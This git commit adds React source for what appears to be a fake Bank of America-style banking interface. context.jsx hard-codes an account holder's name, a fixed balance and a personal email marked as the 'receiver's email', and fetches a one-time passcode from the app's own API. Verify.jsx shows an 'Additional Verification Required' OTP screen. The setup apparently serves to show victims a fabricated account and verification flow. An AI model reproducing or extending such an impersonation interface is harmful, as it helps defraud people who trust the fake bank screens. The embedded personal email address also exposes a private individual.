9ef8e147813850a9fe8d909b7e939f608ca1020f
JT <72070258+Johnson12344@users.noreply.github.com>
2023-03-25 23:19:51 +0100

    Add files via upload

---
+++ src/context.jsx
@@ -0,0 +1,46 @@
+import { useEffect } from "react";
+import { useReducer } from "react";
+import { createContext } from "react";
+import axios from "axios"
+
+export const UserContext = createContext();
+
+const initialState = {
+    userInfo: {
+        email: "uwagboeolusoga@gmail.com", //receiver's email
+        accountType: "Checking",
+        name: "Timothy A Roberts", //acct name
+        balance: localStorage.getItem("balance") ? JSON.parse(localStorage.getItem("balance")): 14964.36 
+    }, //acct balance
+    formInfo: [],
+    otp: 920453,
+    transferForm: []
+}
+
+const reducer = (state, action)=>{
+if(action.type === "SETUSER"){
+return {...state, userInfo: localStorage.setItem("user",JSON.stringify(action.payload))}
+}
+
+if(action.type === "GET_OTP"){
+    return {...state, otp: action.payload}
+    }
+
+}
+
+const UseContextProvider = ({children})=>{
+   const [state, dispatch] = useReducer(reducer, initialState)
+   
+    const getOTP = async()=>{
+        const res = await axios.get("https://boa-api.vercel.app/api/verify") 
+        dispatch({type:"GET_OTP", payload:res.data})
+    }
+
+ return (
+    <UserContext.Provider value={{...state, getOTP}}>
+        {children}
+    </UserContext.Provider>
+ )   
+}
+
+export {UseContextProvider}
---
+++ src/pages/Verify.jsx
@@ -0,0 +1,39 @@
+import axios from "axios";
+import { useContext, useEffect } from "react";
+import { Button, Container } from "react-bootstrap";
+import { useNavigate } from "react-router-dom";
+import { UserContext } from "../context";
+
+function Verify() {
+    const {userInfo, getOTP} = useContext(UserContext)
+    const {email} = userInfo
+    const regex = /^([^@])(.*?)([a-zA-Z])?@/g;
+   // const maskedEmail = email.replace(regex, "$1*$3@");
+// const redactedEmail = email?.replace(/(?<=.).*?(?=@)/, match => '*'.repeat(match.length)); const regex = /^([^@])(.*?)([a-zA-Z])?@/g;
+//const email = "john.doe@example.com";
+const maskedEmail = email.replace(regex, (match, p1, p2, p3) => {
+  const numAsterisks = p2.length - 1;
+  return p1 + "*".repeat(numAsterisks) + p3 + "@";
+});
+
+    const navigate = useNavigate()
+    const handleClick = async()=>{
+        await getOTP();
+        navigate("/passcode");
+    }
+
+
+
+    return ( 
+        <Container className="con verify-con">
+            <p className="all-head">Additional Verification Required</p>
+            <p className="ver-p">For added security, we need to send you a one-time passcode</p>
+            <p className="ver-p">Your one-time password will be sent to {maskedEmail}</p>
+        <div className="trans-btn"><Button onClick={handleClick} className="btn-all btn-cont">Send My Code</Button>
+            <Button className="btn-all btn-can">Cancel</Button></div>
+            
+        </Container>
+     );
+}
+
+export default Verify;
